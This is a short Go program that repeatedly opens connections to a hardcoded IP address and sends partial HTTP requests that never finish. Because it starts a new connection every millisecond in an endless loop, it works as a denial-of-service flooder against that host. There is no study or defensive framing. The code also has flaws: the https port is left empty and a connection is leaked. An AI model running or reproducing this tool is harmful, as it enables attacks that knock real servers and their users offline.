package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"html/template"
	"net"
	"net/http"
	"net/url"
	"time"
)

const (
	UserAgent = "Mozilla/5.0 (X11; Linux x86_64; rv:6.0) Gecko/20140313 Firefox/36.0"
	Payload   = "{{ .Method }} {{ .Path }} HTTP/1.1\r\nHost: {{ .Host }}\r\nUser-Agent: {{ .UserAgent }}\r\n"
	URL       = "http://88.198.8.149"
	Count     = 1000
)

type PayloadParams struct {
	Method    string
	Path      string
	Host      string
	UserAgent string
}

func generatePayload(method, host, path string) ([]byte, error) {
	t, err := template.New("Payload").Parse(Payload)
	if err != nil {
		return nil, err
	}

	params := &PayloadParams{
		Method:    method,
		Path:      path,
		Host:      host,
		UserAgent: UserAgent,
	}

	var buf bytes.Buffer

	if err := t.Execute(&buf, params); err != nil {
		return nil, nil
	}

	return buf.Bytes(), nil
}

func do(host, port, path string, payload []byte, isTLS bool) {
	defer func() {
		recover()
	}()

	addr := fmt.Sprintf("%s:%s", host, port)

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		panic("failed to open socket")
	}

	if isTLS {
		conn, err = tls.Dial("tcp", addr, nil)
		if err != nil {
			panic("failed to open socket")
		}
	}

	_, err = conn.Write(payload)
	if err != nil {
		panic("failed to send packet")
	}

	conn.Read(nil)
}

func main() {
	isTLS := false

	parsedURL, err := url.Parse(URL)
	if err != nil {
		panic("failed to parse url")
	}

	host := parsedURL.Host

	port := parsedURL.Port()
	if port == "" {
		switch parsedURL.Scheme {
		case "http":
			port = "80"
		case "https":
			isTLS = true
		}
	}

	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	payload, err := generatePayload(http.MethodGet, host, path)
	if err != nil {
		panic("failed to generate payload")
	}

	for {
		go func() {
			do(host, port, path, payload, isTLS)
		}()
		time.Sleep(time.Millisecond)
	}
}
